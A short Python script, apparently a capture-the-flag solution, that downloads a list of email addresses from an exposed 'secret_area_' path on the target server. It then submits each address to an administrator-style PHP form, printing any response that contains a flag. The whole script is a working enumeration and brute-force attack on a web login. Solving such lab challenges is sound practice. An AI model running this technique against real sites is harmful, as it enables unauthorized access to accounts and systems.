#############################
#							#
#			aora			#
#							#
#############################

import requests

r = requests.get('http://$HOST:$PORT/main/secret_area_/mails.txt')

for line in r.iter_lines():
	#clear quotes from line
	q_cleared = str(line).split("'")
	
	#split name and mail
	sz = q_cleared[1].split(" ")

	mail = ""

	if(len(sz) == 2):
		mail = sz[1]

	if(len(sz) == 3):
		mail = sz[2]

	if(len(sz) == 4):
		mail = sz[3]

	#send post with mail parameter
	post = requests.post('http://$HOST:$PORT/main/Diaxirisths.php',data={"name1":mail,"name2":"xx","submit":"Send"})

	if("flag" in post.text):
		print(mail)
		print(post.text);
	